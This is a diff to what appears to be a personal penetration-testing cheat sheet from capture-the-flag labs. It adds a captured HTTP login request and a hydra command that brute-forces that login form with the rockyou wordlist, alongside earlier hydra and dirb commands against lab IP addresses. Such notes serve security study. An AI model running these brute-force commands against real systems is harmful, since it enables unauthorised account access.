@@ -96,6 +96,35 @@ Bruteforce command using hydra for login page
 hydra -l milesdyson -P log1.txt 10.10.229.33 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
 hydra -l fox -P /usr/share/wordlists/rockyou.txt -f 10.10.209.75 http-get
 
+hydra post form brueforce 
+-------------------------
+POST /components/user/controller.php?action=authenticate HTTP/1.1
+Host: 10.10.110.113:62337
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 56
+Origin: http://10.10.110.113:62337
+Connection: close
+Referer: http://10.10.110.113:62337/
+Cookie: f9c7294bc8f6035df784b56b800b122c=7h1oqgl01k7chdp4snmjlstkpp
+
+username=user&password=bitnami&theme=default&language=en
+
+bruteforce
+==========
+hydra -l john -P /usr/share/wordlists/rockyou.txt 10.10.110.113 -s 62337 http-post-form "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:Incorrect Username or Password"
+
+
+
+
+
+
+
+
 Finding hidden directories with dirb
 dirb http://10.10.181.92 /usr/share/wordlists/dirb/common.txt
 
